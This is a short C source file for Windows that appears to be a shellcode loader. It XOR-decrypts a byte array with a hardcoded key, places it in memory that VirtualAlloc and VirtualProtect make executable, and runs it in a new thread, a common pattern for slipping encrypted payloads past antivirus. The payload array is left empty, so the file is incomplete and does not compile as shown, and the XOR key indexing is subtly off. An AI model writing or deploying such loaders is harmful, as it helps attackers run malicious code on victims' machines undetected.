#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char mitan[] = 

void XOR(char *data, size_t data_len, char *key, size_t key_len)
{
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++)
	{
		if (j == key_len - 1)
			j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void)
{

	void *mitan_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned int mitan_len = sizeof(mitan);
	char key[] = "pleaseletmein!@@#!#!@!";

	mitan_mem = VirtualAlloc(0, mitan_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	XOR((char *)mitan, mitan_len, key, sizeof(key));

	RtlMoveMemory(mitan_mem, mitan, mitan_len);

	rv = VirtualProtect(mitan_mem, mitan_len, PAGE_EXECUTE_READ, &oldprotect);

	if (rv != 0)
	{
		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)mitan_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}

	return 0;
}
